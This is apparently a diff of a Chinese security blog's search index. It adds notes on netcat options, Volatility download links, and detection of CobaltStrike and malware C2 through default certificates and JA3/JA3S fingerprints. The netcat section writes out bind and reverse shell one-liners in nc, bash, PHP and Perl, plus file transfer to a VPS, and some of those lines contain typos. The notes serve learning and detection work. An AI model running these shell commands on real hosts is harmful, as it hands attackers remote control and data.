@@ -5711,6 +5711,13 @@
 <h4 id="本地端口映射"><a href="#本地端口映射" class="headerlink" title="本地端口映射"></a>本地端口映射</h4><p>如果目标服务器由于防火墙的限制，部分端口的数据无法通过防火墙，可以将目标服务器相应端口的数据透传到防火墙允许的其他端口。</p>
 <p>在目标主机上执行如下命令，即可从远程桌面连接目标机器的53端口。</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lcx -tran 53 【目标主机IP】 3389</span><br></pre></td></tr></table></figure>
+<h4 id="netcat"><a href="#netcat" class="headerlink" title="netcat"></a>netcat</h4><p>netcat 的作用是从网络的一端读取数据，输出到网络的另一端。</p>
+<p>NC的使用：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">（1）命令</span><br><span class="line">-d：后台模式</span><br><span class="line">-e：程序重定向</span><br><span class="line">-g：设置路由器通信网关，最多8个</span><br><span class="line">-G：设置源路由指向器的数量，值为4的倍数</span><br><span class="line">-h：在线帮助</span><br><span class="line">-i：设置时间延迟间隔</span><br><span class="line">-l：使用监听模式</span><br><span class="line">-n：之间使用IP地址</span><br><span class="line">-o[输出文件]：指定文件名称</span><br><span class="line">-p[通信端口]：设置本地主机使用的通信端口</span><br><span class="line">-r：随机指定本机与远程主机通信端口</span><br><span class="line">-s[源地址]：设置本地主机发送出数据包的IP地址</span><br><span class="line">-u：使用UDP协议</span><br><span class="line">-v：详细输出</span><br><span class="line">-w[超时秒数]：设置等待连线的时间</span><br><span class="line">-z：将输入&#x2F;输出功能关闭</span><br><span class="line"></span><br><span class="line">（2）banner抓取</span><br><span class="line">nc -nv xxx.xx.xxx.xxx 22</span><br><span class="line"></span><br><span class="line">（3）连接远程主机</span><br><span class="line">nv -nvv xxx.xx.xxx.xx 80</span><br><span class="line"></span><br><span class="line">（4）端口扫描</span><br><span class="line">nc -v xxx.xxx.xx.xx 80</span><br><span class="line">nc -v -z xx.xxx.xxx.xx 20-1024</span><br><span class="line"></span><br><span class="line">（5）端口监听</span><br><span class="line">nc -l -p 9999</span><br><span class="line"></span><br><span class="line">（6）文件传输</span><br><span class="line">nc -lp 222 &gt;1.txt</span><br><span class="line">nc -vn [VPS]  222 &lt;1.txt -q 1</span><br></pre></td></tr></table></figure>
+<p>获取shell</p>
+<p>正向shell：客户端连接服务器，客户端想获取服务器的shell</p>
+<p>反向shell：客户端连接服务器，服务器想获取客户端的shell</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">（1）正向shell</span><br><span class="line">nc -lvp 4444 -e &#x2F;bin&#x2F;sh     &#x2F;&#x2F;Linux</span><br><span class="line">nc -lvp 4444 -e C:\windows\system32\cmd.exe    &#x2F;&#x2F;Windows</span><br><span class="line">在本机或VPS上输入：nc xxx.x.xxx.x  4444</span><br><span class="line"></span><br><span class="line">（2）反向shell</span><br><span class="line">本地监听：nc -lvp 9999</span><br><span class="line">目标主机：</span><br><span class="line">nc xx.xx.xx.xxx 999 -e &#x2F;bin&#x2F;sh      &#x2F;&#x2F;Linux</span><br><span class="line">nc xxx.xx.xxxx.xx 999 -e c:\windows\system32\cmd.exe   &#x2F;&#x2F;Windows</span><br><span class="line"></span><br><span class="line">（3）Bash反向shell</span><br><span class="line">本地：nc -lvp 4444</span><br><span class="line">目标：bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;xxx.xxx.xxx.xx&#x2F;4444 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">（4）PHP反向shell</span><br><span class="line">本地：nc -lvp 2222</span><br><span class="line">目标：php -r &#39;sock&#x3D;fsockopen(&quot;xxx.xxx.xx.xx&quot;，2222)；exec(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span><br><span class="line"></span><br><span class="line">（5）Perl反向shell</span><br><span class="line">本地：nc -lvp 4444</span><br><span class="line">目标：perl -e &#39;use Socket;$i&#x3D;&quot;192.168.1.23&quot;;$p&#x3D;4444;socket(S,PF_INEF,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN，&quot;&gt;&amp;S&quot;)open(STDOUT，&quot;&gt;&amp;S&quot;);open(STDERR，&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;sh -i&quot;);&#125;;&#39;</span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
         <category>读书笔记</category>
@@ -6579,6 +6586,80 @@ NIST 网络安全框架，第二章已经介绍
       </categories>
       <tags>
         <tag>web安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>volatility内存取证</title>
+    <url>/2021/03/07/volatility%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/</url>
+    <content><![CDATA[<hr>
+<a id="more"></a>
+<pre><code>## 什么是Volatility
+</code></pre><p>Volatility是一款非常强大的内存取证工具,它是由来自全世界的数百位知名安全专家合作开发的一套工具, 可以用于windows,linux,mac osx,android等系统内存取证。</p>
+<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><pre><code>windows版可执行程序:
+http://downloads.volatilityfoundation.org/releases/2.6/volatility_2.6_win64_standalone.zip
+
+linux版可执行程序:
+http://downloads.volatilityfoundation.org/releases/2.6/volatility_2.6_lin64_standalone.zip
+
+Max OS X版可执行序:
+http://downloads.volatilityfoundation.org/releases/2.6/volatility_2.6_mac64_standalone.zip
+
+源代码:
+http://downloads.volatilityfoundation.org/releases/2.6/volatility-2.6.zip
+</code></pre><p>老版KALI自带。</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>识别CobaltStrike到JA3</title>
+    <url>/2021/04/01/%E8%AF%86%E5%88%ABCobaltStrike%E5%88%B0JA3/</url>
+    <content><![CDATA[<hr>
+<a id="more"></a>
+<h2 id="关于识别CobaltStrike特征"><a href="#关于识别CobaltStrike特征" class="headerlink" title="关于识别CobaltStrike特征"></a>关于识别CobaltStrike特征</h2><p>在CobaltStrike的客户端与服务端建立联系时，服务端传给客户端的SSL默认证书有很明显的特征：</p>
+<p>C=Earth，ST=Cyberspace，L=Somewhere，O=CobaltStrike，OU=AdvancedPenTesting，CN=Major CobaltStrike</p>
+<p><img src="/2021/04/01/%E8%AF%86%E5%88%ABCobaltStrike%E5%88%B0JA3/image-20210401184818977.png" alt="image-20210401184818977"></p>
+<p>并且默认连接端口为50050端口。</p>
+<p>所以可以以此检测CobaltStrike：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">连接端口50050.</span><br><span class="line"></span><br><span class="line">SSL证书信息：C&#x3D;Earth，ST&#x3D;Cyberspace，L&#x3D;Somewhere，O&#x3D;CobaltStrike，OU&#x3D;AdvancedPenTesting，CN&#x3D;Major CobaltStrike</span><br></pre></td></tr></table></figure>
+<h2 id="JA3"><a href="#JA3" class="headerlink" title="JA3"></a>JA3</h2><p>JA3是一种在线识别TLS客户端指纹的方法。</p>
+<p>在日常中，不仅正常的应用程序会使用TLS或者SSL对流量进行加密。而且恶意程序也常常使用TLS和SSL进行加密。</p>
+<p>为了启动TLS会话，客户端将在TCP3次握手后发送TLS客户端的Hello数据包，这个数据包及其生成方式取决于构建客户端应用程序所使用的软件包和方法，如果接受TLS连接，服务器将使用基于服务器端库和配置以及Client Hello消息中的详细信息创建的TLS Server Hello数据包进行相应。由于TLS协商是以明文的方式传输的，所以，可以使用TLS Client Hello数据包中的详细信息对客户端应用程序进行指纹识别。 </p>
+<p>JA3方法用于收集Client Hello数据包中以下字段的十进制字节值：版本、可接受的密码、扩展列表、椭圆曲线密码和椭圆曲线密码格式。然后将这些值串联到一起，在使用“,”分割开各个字段，同时用“-”来分隔各个字段中的各个值。</p>
+<p><img src="/2021/04/01/%E8%AF%86%E5%88%ABCobaltStrike%E5%88%B0JA3/image-20210401190114440.png" alt="image-20210401190114440"></p>
+<p>这些字段的顺序如下：TLS版本信息、可接受的密码、扩展列表、椭圆曲线密码和椭圆曲线密码格式。</p>
+<p>用CobaltStrike4.1的连接流量举例。</p>
+<p><img src="/2021/04/01/%E8%AF%86%E5%88%ABCobaltStrike%E5%88%B0JA3/image-20210401190157329.png" alt="image-20210401190157329"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">771,49188-49192-61-49190-49194-107-106-49162-49172-53-49157-49167-57-56-49187-49191-60-49189-49193-103-64-49161-49171-47-49156-49166-51-50-49196-49195-49200-157-49198-49202-159-163-49199-156-49197-49201-158-162,67,,11-2-256(如果无上述字段，则这些字段的值为空)</span><br></pre></td></tr></table></figure>
+<p>然后会计算这些字符串的MD5哈希值，以生成易于使用和共享的长度为32字符的指纹，他们就是JA3 TLS客户端的指纹。比如上述CobaltStrike4.1客户端指纹：fa704723a210632b2ff9ad03be418651。</p>
+<h2 id="JA3S"><a href="#JA3S" class="headerlink" title="JA3S"></a>JA3S</h2><p>创建JA3后，就可以使用同样的方式对TLS的服务端进行指纹识别，即对TLS Server Hello信息进行指纹识别。JA3S会收集Server Hello数据包中以下各个字段的十进制字节值：版本、可接受的加密算法和扩展列表，然后将这些值串联起来，使用“,”来分隔各个字段，使用“-”分隔每个字段中的各个值。</p>
+<p>这些字段的顺序如下：TLS版本信息、可接受的密码、扩展列表。</p>
+<p><img src="/2021/04/01/%E8%AF%86%E5%88%ABCobaltStrike%E5%88%B0JA3/image-20210401191102000.png" alt="image-20210401191102000"></p>
+<p>CobaltStrike4.1的服务端：771,49192,9——–&gt;5513ab2983a0db88fadd353de0341e7c</p>
+<h2 id="使用MD5的原因"><a href="#使用MD5的原因" class="headerlink" title="使用MD5的原因"></a>使用MD5的原因</h2><p>因为MD5可以更容易集成到现有的技术中。</p>
+<h2 id="JA3S工作原理"><a href="#JA3S工作原理" class="headerlink" title="JA3S工作原理"></a>JA3S工作原理</h2><p>同一台服务器会根据Client Hello信息机器内容以不同的方式创建Server Hello消息，因此，这里不能跟JA3那样，仅仅根据服务器的Hello消息来对其进行指纹识别。尽管服务器对不同客户端的响应不同，但是他们对同一客户端的响应总是一致的。</p>
+<p>比如：客户端正在发送TLS Client Hello数据包，其中数据都是A。因此，服务器会的响应的内容也是由A构成，并将始终用A来提供同样的响应。与此同时，另一个客户端也在发送数据包，并且内容都是B。类似的，服务器现在会用B进行响应，并且总是用B组成的B串进行响应。可以看到，对于不同的客户端，服务器会给予不同的响应，但是对于每个客户端来说，总是以相同的方式进行相应。</p>
+<p><img src="/2021/04/01/%E8%AF%86%E5%88%ABCobaltStrike%E5%88%B0JA3/image-20210401191300640.png" alt="image-20210401191300640"></p>
+<p>在这个日志输出中，JA3位于左侧，JA3S位于右侧，使用同一客户端与同一服务器交互了4次。然后，再次使用不同的客户端进行了4次以上的交互。不难发现，服务器的响应方式对于同一客户端总是相同的，但对于不同的客户端却是不同的。</p>
+<h2 id="安全用途"><a href="#安全用途" class="headerlink" title="安全用途"></a>安全用途</h2><p>如果攻击方构建了定制的恶意软件可执行文件，那么JA3指纹很可能对该可执行文件来说是唯一的。</p>
+<p>例如：MetaSploit 的 Meterpreter 和 CobaltStrike（并非4.1版本） 的 Beacon 都使用 Windows 套接字来启动 TLS 通信。在 Windows 10 上，JA3=72a589da586844d7f0818ce684948eea（指定 IP 地址），JA3=a0e9f5d64349fb13191bc781f81f42e1（指定域名）。由于 Windows 上的其他普普通通的应用程序也使用相同的套接字，因此，我们很难识别其中的恶意通信。但是，Kali Linux 上的 C2 服务器对该客户端应用程序的响应方式与 Internet 上的普通服务器对该套接字的响应方式相比来说是独一无二的。尽管服务器对不同客户端的响应不同，但它们对同一客户端的响应总是一致的。因此，如果结合 ja3+ja3s，就能够识别这种恶意通信，而不用考虑目的地 IP、域名或证书等细节信息。</p>
+<p>Trickbot恶意软件：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">JA3 &#x3D; 6734f37431670b3ab4292b8f60f29984 （trickbot）</span><br><span class="line">JA3S &#x3D; 623de93db17d313345d7ea481e7443cf（C2服务器的响应）</span><br></pre></td></tr></table></figure>
+<p> Emotet恶意软件：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">JA3 &#x3D; 4d7a28d6f2263ed61de88ca66eb011e3 ( Emotet )</span><br><span class="line">JA3S &#x3D; 80b3a14bccc8598a1f3bbe83e71f735f (C2服务器的响应 )</span><br></pre></td></tr></table></figure>
+<p>在这些恶意软件样本中，C2服务器始终以完全相同的方式来响应恶意软件客户端，应该说是分毫不差，因此，即使流量被加密，并且不知道C2服务器的IP地址和域名，因为他们会不断变化，我们任能通过指纹来识别客户端和服务器之间的TLS写上，以提高恶意通信识别结果的可信度。</p>
+<p>JA3和JA3S地址：https：//github.com/salesforce/ja3</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://my.oschina.net/u/3896378/blog/4555703" target="_blank" rel="noopener">https://my.oschina.net/u/3896378/blog/4555703</a></p>
+]]></content>
+      <categories>
+        <category>横贯八方</category>
+      </categories>
+      <tags>
+        <tag>横贯八方</tag>
       </tags>
   </entry>
 </search>
